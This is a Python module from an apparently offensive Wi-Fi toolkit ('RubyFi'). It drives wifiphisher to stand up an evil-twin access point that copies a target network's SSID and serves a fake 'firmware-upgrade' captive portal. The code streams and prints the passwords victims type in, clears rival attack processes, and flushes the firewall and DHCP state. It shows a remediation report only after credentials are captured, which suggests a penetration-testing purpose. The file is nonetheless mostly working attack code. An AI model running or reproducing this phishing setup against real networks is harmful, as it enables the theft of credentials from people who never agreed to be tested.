# attacks/wifi_phishing.py

import os
import subprocess
import shlex
import signal
import sys
import time
import logging
from subprocess import Popen
from termcolor import colored
from .base import BaseNonMonitorAttack
from pathlib import Path  # ← add this if missing
from solution.remediation import RemediationAdvisor




logger = logging.getLogger(__name__)

# ANSI colour shortcuts
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
T = "\033[36m"
W = "\033[0m"

WIFIPHISHER_PID_FILE = "/tmp/wifiphisher_rubifi.pid"
WIFIPHISHER_SCRIPT   = "/tmp/rubifi_wifiphisher.sh"


class WiFiPhishing(BaseNonMonitorAttack):
    """
    Wi-Fi phishing attack that delegates all rogue AP / DHCP / firewall
    logic to wifiphisher. Uses a normal managed/AP interface (no monitor).
    """

    def __init__(self, ap_interface, target_bssid, target_ssid, target_channel):
        super().__init__(ap_interface)
        self.ap_interface    = ap_interface
        self.target_bssid    = target_bssid
        self.target_ssid     = target_ssid
        self.target_channel  = str(target_channel)
        # Captures directory (relative to project root)
        _captures_dir = Path(__file__).parent.parent / "captures"
        _captures_dir.mkdir(parents=True, exist_ok=True)

        # Save credentials inside captures folder
        self._credential_log = str(
            _captures_dir / f"wifiphisher_{target_ssid.replace(' ', '_')}.txt"
        )

        self._wifiphisher_proc = None

    # ─────────────────────────────────────────────────────────────────────
    # PRE-ATTACK CLEANUP
    # ─────────────────────────────────────────────────────────────────────
    def _pre_attack_cleanup(self):
        """Kill all previous attacks, rogue APs, and flush victim data."""
        print(colored("\n🧹 Clearing previous attack memory...", "cyan"))

        # Kill ALL wifiphisher processes
        subprocess.run("pkill -f wifiphisher", shell=True, capture_output=True)

        # Kill ALL rogue AP / related processes
        for proc in ["airbase-ng", "hostapd", "lighttpd", "dnsmasq",
                     "mdk4", "aireplay-ng", "airodump-ng"]:
            subprocess.run(f"pkill -f {proc}", shell=True, capture_output=True)

        # Kill all at* interfaces
        for i in range(5):
            subprocess.run(f"ip link set at{i} down 2>/dev/null",
                           shell=True, capture_output=True)

        # Restart NetworkManager for clean state
        subprocess.run("systemctl stop NetworkManager",
                       shell=True, capture_output=True)
        time.sleep(1)
        subprocess.run("systemctl start NetworkManager",
                       shell=True, capture_output=True)

        # Flush iptables
        subprocess.run("iptables -t nat -F 2>/dev/null",
                       shell=True, capture_output=True)
        subprocess.run("iptables -F 2>/dev/null",
                       shell=True, capture_output=True)

        # Flush ARP cache
        subprocess.run("ip neigh flush all 2>/dev/null",
                       shell=True, capture_output=True)

        # Clear old DHCP leases
        for lease_file in ["/var/lib/misc/dnsmasq.leases",
                            "/tmp/dnsmasq.leases",
                            "/tmp/dnsmasq_evil.leases"]:
            subprocess.run(f"rm -f {lease_file}", shell=True, capture_output=True)

        # Clear old wifiphisher temp files
        subprocess.run(
            "rm -f /tmp/*wifiphisher* /tmp/*evil* /tmp/*csa* /tmp/*hostapd*",
            shell=True, capture_output=True
        )

        # Clear old credential log
        if os.path.exists(self._credential_log):
            os.remove(self._credential_log)

        time.sleep(2)
        print(colored("[✓] All previous attacks cleared!", "green"))
        print(colored("[✓] ARP cache flushed", "green"))
        print(colored("[✓] DHCP leases cleared", "green"))
        print(colored("[✓] Rogue APs removed\n", "green"))

    # ─────────────────────────────────────────────────────────────────────
    # PUBLIC ENTRY POINT
    # ─────────────────────────────────────────────────────────────────────
    def _execute(self):
        self.ap_interface = self.interface  # from BaseNonMonitorAttack
        self._print_banner()

        if os.geteuid() != 0:
            sys.exit(colored("[!] Please run as root.", "red"))

        # Run full cleanup before attack starts
        self._pre_attack_cleanup()

        # Verify interface
        if not self._iface_ok_for_wifiphisher(self.ap_interface):
            raise RuntimeError(
                f"Interface {self.ap_interface} is not a managed/AP wireless "
                "interface. Use the base iface (e.g. wlan0) and do NOT enable "
                "monitor mode before this attack."
            )

        try:
            self._step("1", "Launching wifiphisher")
            self._start_wifiphisher()

            self._print_status()

            self._keepalive_loop()

        except Exception as exc:
            print(colored(f"\n[!] Error: {exc}", "red"))
            import traceback
            traceback.print_exc()
            input(colored("\nPress Enter to return to menu…", "yellow"))
        finally:
            self._cleanup()

            # Show remediation only if credentials were actually captured
            try:
                if os.path.exists(self._credential_log) and os.path.getsize(self._credential_log) > 0:
                    advisor = RemediationAdvisor()

                    print(colored("Loading report and fixing steps ", "yellow"), end="")

                    spinner = ["|", "/", "-", "\\"]

                    for i in range(12):  # animation cycles
                        sys.stdout.write("\r" + colored("Loading report and fixing steps " + spinner[i % 4], "yellow"))
                        sys.stdout.flush()
                        time.sleep(0.25)
                    
                    time.sleep(5)
                    print("\r" + colored("Report loaded successfully ✓", "green"))
                    os.system("clear") 
                    advisor.show(
                        attack_type="evil_twin",
                        target_ssid=self.target_ssid,
                        target_bssid=self.target_bssid,
                        extra_info={
                            "credential_log": self._credential_log,
                            "channel": self.target_channel,
                            "attack": "Wi-Fi Phishing / Captive Portal"
                        }
                    )
            except Exception as e:
                print(colored(f"[!] Failed to show remediation: {e}", "yellow"))


    # ─────────────────────────────────────────────────────────────────────
    # INTERFACE CHECK
    # ─────────────────────────────────────────────────────────────────────
    @staticmethod
    def _iface_ok_for_wifiphisher(iface: str) -> bool:
        """Ensure iface exists in 'iw dev' and is not pure monitor."""
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        blocks = out.strip().split("Interface ")
        for block in blocks:
            if not block:
                continue
            lines = block.splitlines()
            name = lines[0].strip()
            if name == iface:
                for ln in lines:
                    ln = ln.strip()
                    if ln.startswith("type "):
                        type_name = ln.split()[1]
                        return type_name != "monitor"
                return True
        return False

    # ─────────────────────────────────────────────────────────────────────
    # WIFIPHISHER LAUNCHER
    # ─────────────────────────────────────────────────────────────────────
    def _start_wifiphisher(self):
        """Launch wifiphisher in a new gnome-terminal window."""
        # Clean previous run artifacts
        for f in [WIFIPHISHER_PID_FILE, self._credential_log, WIFIPHISHER_SCRIPT]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except OSError:
                    pass

        cmd = [
            "wifiphisher",
            "-i",  self.ap_interface,
            "-e",  self.target_ssid,
            "-p",  "firmware-upgrade",
            "-nD",
            "-nE",
            "-cP", self._credential_log,
            "--logging",
            "-lP", "/tmp/wifiphisher.log",
        ]

        cmd_str = shlex.join(cmd)
        print(colored(f"[*] Command: {cmd_str}", "cyan"))

        script_content = f"""#!/bin/bash

echo "[*] Starting wifiphisher..."
echo "[*] Command: {cmd_str}"
echo ""

{cmd_str} &
WF_PID=$!
echo $WF_PID > {WIFIPHISHER_PID_FILE}

echo "[*] wifiphisher PID: $WF_PID"
echo ""

wait $WF_PID
EXIT_CODE=$?

echo ""
echo "========================================"
if [ $EXIT_CODE -eq 0 ]; then
    echo "  wifiphisher exited cleanly."
else
    echo "  wifiphisher exited with code: $EXIT_CODE"
    echo "  Check /tmp/wifiphisher.log for details."
fi
echo "========================================"
echo ""
read -r -p "Press Enter to close this window..."
"""

        with open(WIFIPHISHER_SCRIPT, "w") as f:
            f.write(script_content)
        os.chmod(WIFIPHISHER_SCRIPT, 0o755)

        # Launch gnome-terminal
        self._wifiphisher_proc = Popen(
            [
                "gnome-terminal",
                "--title=RubyFi — WiFi Phishing",
                "--",
                "bash", WIFIPHISHER_SCRIPT
            ],
            preexec_fn=os.setsid,
        )

        print(colored("[*] Waiting for wifiphisher to initialize…", "cyan"))

        # Poll for PID file
        for i in range(15):
            if os.path.exists(WIFIPHISHER_PID_FILE):
                with open(WIFIPHISHER_PID_FILE) as f:
                    pid = f.read().strip()
                if pid:
                    print(colored(f"[✓] wifiphisher running (PID {pid})", "green"))
                    return
            print(colored(f"[*] Waiting… ({i+1}/15)", "cyan"), end="\r")
            time.sleep(1)

        print(colored(
            "\n[!] PID file not found after 15s — check the opened terminal.",
            "yellow"
        ))
        print(colored("[*] Continuing anyway — press Ctrl+C to stop.\n", "cyan"))

    # ─────────────────────────────────────────────────────────────────────
    # CREDENTIAL MONITOR
    # ─────────────────────────────────────────────────────────────────────
    def _keepalive_loop(self):
        """Monitor for captured credentials in real-time."""
        seen_creds = set()
        print(colored(
            "\n[*] Attack is LIVE — Press Ctrl+C to stop\n",
            "cyan"
        ))

        try:
            while True:
                # Check if wifiphisher exited on its own
                if os.path.exists(WIFIPHISHER_PID_FILE):
                    with open(WIFIPHISHER_PID_FILE) as f:
                        pid_str = f.read().strip()
                    if pid_str:
                        try:
                            os.kill(int(pid_str), 0)  # existence check
                        except ProcessLookupError:
                            print(colored(
                                "\n[*] wifiphisher has exited on its own.",
                                "yellow"
                            ))
                            break

                # Stream new credentials
                if os.path.exists(self._credential_log):
                    with open(self._credential_log) as fh:
                        for line in fh:
                            line = line.strip()
                            if line and line not in seen_creds:
                                seen_creds.add(line)
                                logger.info("Credentials: %s", line)
                                print(colored(
                                    f"\n  [★] Captured → {line}",
                                    "green", attrs=["bold"]
                                ))

                time.sleep(1)

        except KeyboardInterrupt:
            print(colored("\n\n[!] Ctrl+C received — stopping attack…", "yellow"))

    # ─────────────────────────────────────────────────────────────────────
    # CLEANUP
    # ─────────────────────────────────────────────────────────────────────
    def _cleanup(self):
        """Kill wifiphisher and clean all artifacts."""
        print(colored("\n[*] Cleaning up…", "cyan"))

        # Kill wifiphisher via PID file
        if os.path.exists(WIFIPHISHER_PID_FILE):
            with open(WIFIPHISHER_PID_FILE) as f:
                pid_str = f.read().strip()
            if pid_str:
                try:
                    os.kill(int(pid_str), signal.SIGTERM)
                    print(colored(
                        f"[*] Sent SIGTERM to wifiphisher (PID {pid_str})",
                        "yellow"
                    ))
                    time.sleep(2)
                    os.kill(int(pid_str), signal.SIGKILL)
                except ProcessLookupError:
                    pass
            try:
                os.remove(WIFIPHISHER_PID_FILE)
            except FileNotFoundError:
                pass

        # Kill any stray wifiphisher
        subprocess.run(["pkill", "-f", "wifiphisher"], capture_output=True)

        # Remove temp script
        if os.path.exists(WIFIPHISHER_SCRIPT):
            try:
                os.remove(WIFIPHISHER_SCRIPT)
            except OSError:
                pass

        # Show credentials summary
        print(colored("\n" + "=" * 50, "green", attrs=["bold"]))
        print(colored("  📋  CAPTURED CREDENTIALS", "green", attrs=["bold"]))
        print(colored("=" * 50, "green", attrs=["bold"]))

        if os.path.exists(self._credential_log):
            creds = [l.strip() for l in open(self._credential_log) if l.strip()]
            if creds:
                for line in creds:
                    logger.info("Credentials: %s", line)
                    print(colored(f"  {line}", "green"))
            else:
                print(colored("  (no credentials captured)", "yellow"))
        else:
            print(colored("  (log file not found)", "yellow"))

        print(colored("=" * 50, "green", attrs=["bold"]))
        print(colored("[✓] Cleanup done\n", "green"))
        print("[" + R + "!" + W + "] Closing")

    # ─────────────────────────────────────────────────────────────────────
    # DISPLAY HELPERS
    # ─────────────────────────────────────────────────────────────────────
    def _print_banner(self):
        print(colored("\n" + "=" * 60, "cyan", attrs=["bold"]))
        print(colored("  🎣  WI-FI PHISHING ATTACK  (RubyFi)", "cyan", attrs=["bold"]))
        print(colored("=" * 60, "cyan", attrs=["bold"]))
        print(colored(f"  Target  : {self.target_ssid}", "white"))
        print(colored(f"  BSSID   : {self.target_bssid}", "white"))
        print(colored(f"  Channel : {self.target_channel}", "white"))
        print(colored("  Mode    : Captive Portal — Single Adapter, No Deauth", "white"))
        print(colored("=" * 60 + "\n", "cyan", attrs=["bold"]))

    def _print_status(self):
        print(colored("\n" + "=" * 60, "green", attrs=["bold"]))
        print(colored("  ✅  WIFIPHISHER ACTIVE!", "green", attrs=["bold"]))
        print(colored("=" * 60, "green", attrs=["bold"]))
        print(colored(f"  Fake AP  : {self.target_ssid} (Open)", "white"))
        print(colored(f"  Scenario : firmware-upgrade", "white"))
        print(colored(f"  Cred Log : {self._credential_log}", "yellow"))
        print(colored(f"  WF Log   : /tmp/wifiphisher.log", "yellow"))
        print(colored("  Press Ctrl+C to stop attack\n", "white"))

    @staticmethod
    def _step(num: str, description: str):
        print(colored(f"\n[*] Step {num}: {description}…", "cyan"))
